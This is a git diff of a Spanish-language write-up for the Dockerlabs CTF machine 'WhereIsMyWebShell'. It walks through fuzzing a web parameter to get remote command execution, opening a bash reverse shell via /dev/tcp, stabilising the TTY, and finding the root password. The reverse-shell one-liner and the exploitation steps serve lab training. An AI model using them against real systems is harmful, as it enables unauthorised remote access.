@@ -1,3 +1,4 @@
+La máquina WhereIsMyWebShell de la plataforma Dockerlabs.es, es una máquina de dificultad "Fácil", la cual nos enseña como realizando un ataque de fuerza bruta de directorios y realizando fuzzing podemos ejecutar un RCE dentro de la máquina víctima, para luego entablarnos una reverse shell para acceder a ella, una vez dentro, encontramos la contraseña de root en base una pista que nos dejaron en la web del puerto 80.
 
 # WHEREISMYWEBSHELL
 
@@ -41,7 +42,9 @@ Con la herramienta ffuf realizaremos fuzzing de para lograr encontrar el paráme
 
 <img width="1340" height="617" alt="where9" src="https://github.com/user-attachments/assets/ee500c72-fa05-4f1d-946c-7d7fa7493ed4" />
 
-Lo probamos para ver si logramos transformar todo esto en un RCE y ¡efectivamente!, logramos ejecución de comandos a nivel de sistema.
+## 💣 EXPLOTACIÓN
+
+Lo probamos para ver si logramos transformar todo esto en un RCE y ¡efectivamente! 🔥, logramos ejecución de comandos a nivel de sistema.
 
 <img width="657" height="212" alt="where10" src="https://github.com/user-attachments/assets/84a33102-64d3-458d-8a28-495c3f90a0c4" />
 
@@ -53,7 +56,13 @@ Nos lanzamos la típica reverse shell de bash > bash -c "bash -i >& /dev/tcp/10.
 
 <img width="880" height="188" alt="where12" src="https://github.com/user-attachments/assets/e5403c82-5dc9-4905-9cf5-cb306329db51" />
 
-Y ¡Ganamos acceso a la máquina víctima!, realizaremos el tratamiento de la tty de la siguiente manera:
+Y ¡Ganamos acceso a la máquina víctima! 🔥
+
+<img width="710" height="389" alt="where13" src="https://github.com/user-attachments/assets/a649aad4-3594-4d10-bc96-bec6309ec9cc" />
+
+## 🔑 ESCALADA DE PRIVILEGIOS
+
+Realizaremos el tratamiento de la tty de la siguiente manera:
 
 ```bash
 script /dev/null -c bash
@@ -62,11 +71,6 @@ stty raw -echo;fg
 reset xterm
 export TERM=xterm && export SHELL=bash
 ```
-
-<img width="710" height="389" alt="where13" src="https://github.com/user-attachments/assets/a649aad4-3594-4d10-bc96-bec6309ec9cc" />
+Y finalmente nos dirigiremos al directorio /tmp como decía la pista, logrando encontrar la contraseña de root, máquina hackeada 🔥 . .
 
 <img width="482" height="487" alt="where14" src="https://github.com/user-attachments/assets/00fa3950-0fe2-4a66-8d77-0f7627d1a79b" />
-
-## 💣 EXPLOTACIÓN
-
-## 🔑 ESCALADA DE PRIVILEGIOS
